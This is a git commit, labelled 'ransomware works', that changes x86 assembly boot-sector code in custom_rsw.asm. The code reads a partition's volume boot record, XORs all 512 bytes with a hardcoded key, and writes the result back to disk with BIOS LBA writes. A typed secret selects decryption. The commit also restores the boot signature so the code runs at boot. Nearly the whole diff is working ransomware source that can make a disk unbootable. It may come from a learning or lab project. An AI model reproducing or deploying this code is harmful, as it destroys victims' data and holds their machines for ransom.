21579e6611a765b2f27f4428195f448c5d428f57
nhat286 <thiennhatnguyenminh@gmail.com>
2018-10-25 18:47:33 +1100

    ransomware works

--- src/asm/custom_rsw.asm
+++ src/asm/custom_rsw.asm
@@ -24,30 +24,30 @@ _start:
     pusha
 
     mov BYTE [drive_type], dl
-
+    
     call _check_input
-
+    
     popa
     retf
-
+    
 _encrypt:
     call _check_partition
     xor WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
     jz _xor
-
-    mov si, secret
+    
+    mov si, xor_success
     call _print_str
-
+    
     ret
 
 _decrypt:
     call _check_partition
-    cmp WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
+    xor WORD [VBR_ADDR + SIGNATURE_OFFSET], 0xaa55
     jnz _xor
-
-    mov si, xor_string
+    
+    mov si, secret
     call _print_str
-
+    
     ret
 
 _check_partition:
@@ -70,11 +70,11 @@ _found_os:
 
     call _reset_disk
 
-_check_extensions:
-    mov ah, 0x41
-    mov bx, 0x55aa
-    int 0x13
-    jc _read_with_chs
+_load_vbr:
+    ;mov ah, 0x41
+    ;mov bx, 0x55aa
+    ;int 0x13
+    ;jc _read_with_chs
 
     ; construct the DAP packet
     mov bx, WORD [part_offset]
@@ -94,7 +94,7 @@ _check_extensions:
 _read_with_lba:
     call _read_sector_lba
     add sp, 0x10
-
+    
     ret
 
 _read_with_chs:
@@ -105,7 +105,7 @@ _read_with_chs:
     mov cl, BYTE [bp + 0x3]         ; sector
     mov bx, VBR_ADDR                ; addr to store the VBR
     call _read_sector
-
+    
     ret
 
 _reset_disk:
@@ -126,8 +126,8 @@ _read_sector_lba:
     jc _read_error
     ret
 
-_write_sector:
-    mov ah, 0x3
+_write_sector_lba:
+    mov ah, 0x43
     int 0x13
     jc _write_error
     ret
@@ -168,11 +168,11 @@ _check_input:
 _in_loop:
 	cli
 	xor ax, ax
-    int 16h                 ; get_key interrupt
-
+    int 16h                 ; get_key interrupt 
+	
 	mov dl, al              ; get_key places next keypress into al
 	mov [buf], dl	    	; move char entered by user into buf
-
+	
 	mov cl, BYTE [secret + bx]
 	or  cl, cl
 	jz  _decrypt
@@ -180,7 +180,7 @@ _in_loop:
 	jnz _encrypt
 	inc bx
 	xor cx, cx
-
+	 
 	mov si, buf             ; SI now points to our message
 _out_loop:
     lodsb                   ; Loads SI into AL and increments SI [next char]
@@ -191,23 +191,13 @@ _out_loop:
 	jmp _out_loop           ; Next iteration of the loop
 
 _xor:
-    ; read the sector containing the vbr into memory
-    mov dl, BYTE [drive_type]
-    mov bp, WORD [part_offset]
-    mov al, 0x1                 ; num of sectors to read
-    mov ch, BYTE [bp + 0x2]     ; cylinder to read from
-    mov dh, BYTE [bp + 0x1]     ; head to read from
-    mov cl, BYTE [bp + 0x3]     ; sector to read from
-    mov bx, VBR_ADDR            ; where to store the sector we read
-    call _read_sector
-
     ; xor the vbr
     lea di, [VBR_ADDR]
     xor bx, bx                  ; use bx as counter
 _xor_loop:
     cmp bx, 0x200               ; loop 512 times ~ a sector/the vbr
     jge _xor_end
-
+    
     ; mod the counter to repeat xor string
     xor dx, dx                  ; dx contains remainder
     mov ax, bx                  ; load current counter/index to ax
@@ -221,22 +211,36 @@ _xor_loop:
     mov cl, BYTE [di + bx]      ; use current counter to index to entry/memory
     xor al, cl
     mov [di + bx], al
-
+    
     inc bx
     jmp _xor_loop
 _xor_end:
     xor ax, ax                  ; null out registers else error
-
+    
+    mov si, xor_success
+    call _print_str
+    
     ; write the local copy of the partition onto the disk
     mov dl, BYTE [drive_type]
-    mov bp, WORD [part_offset]
-    mov al, 0x1                 ; num of sectors to write
-    mov ch, BYTE [bp + 0x2]     ; cylinder to write to
-    mov dh, BYTE [bp + 0x1]     ; head to write to
-    mov cl, BYTE [bp + 0x3]     ; sector to write to
-    mov bx, VBR_ADDR            ; where the sector we want to write to
-    call _write_sector
-    hlt
+    call _reset_disk
+    ; copy back the modified vbr onto disk
+    mov bx, WORD [part_offset]
+    mov edi, DWORD [bx + START_VBR_LBA_OFFSET]
+    
+    push DWORD 0x0
+    push edi
+
+    push 0x0
+    push VBR_ADDR
+
+    push 0x1
+    push 0x10
+
+    mov si, sp
+    call _write_sector_lba
+    add sp, 0x10
+    
+    ret
 
 _end_loop:                  ; after printing an error, we should just loop forever
     jmp _end_loop
@@ -249,6 +253,7 @@ read_disk_error_msg:        db "Error reading sector.", 0x0d, 0x0a, 0x00
 write_error_msg:            db "Error writing sector.", 0x0d, 0x0a, 0x00
 no_os_error_msg:            db "No operating system found!", 0x0d, 0x0a, 0x00
 xor_string:                 db "wh4Tz d0_u W4nt?"
+xor_success:                db "Finish xoring", 0x00
 drive_type:                 db 0x00
 part_offset:                dw 0x0000
 
@@ -256,5 +261,5 @@ part_offset:                dw 0x0000
 times 0x1fe - ($ - $$) db 0x00
 
 ; boot signature
-;dw 0xaa55
-dw 0x0000
+dw 0xaa55
+;dw 0x0000
